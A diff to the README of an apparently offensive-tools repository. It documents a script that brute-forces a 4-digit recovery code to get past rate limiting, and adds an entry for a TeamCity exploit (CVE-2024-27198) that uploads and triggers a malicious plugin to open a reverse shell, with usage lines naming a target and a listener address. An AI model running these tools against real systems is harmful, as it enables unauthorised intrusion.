@@ -16,3 +16,10 @@ This Python script brute-forces a 4-digit numeric recovery code on a vulnerable 
 
 ## Usage
 python3 bypass_rate_limiting.py -ip <TARGET_IP> -p <PORT> -SID <PHPSESSID> -t <THREADS>
+
+## TeamCity Evil Plugin Exploit
+
+This script automates the process of building, uploading, enabling, and triggering a malicious TeamCity plugin that provides a reverse shell.
+
+## Usage
+python3 teamcity_CVE-2024-27198.py -t http://target:8111 -l 10.10.14.5 -p 4444
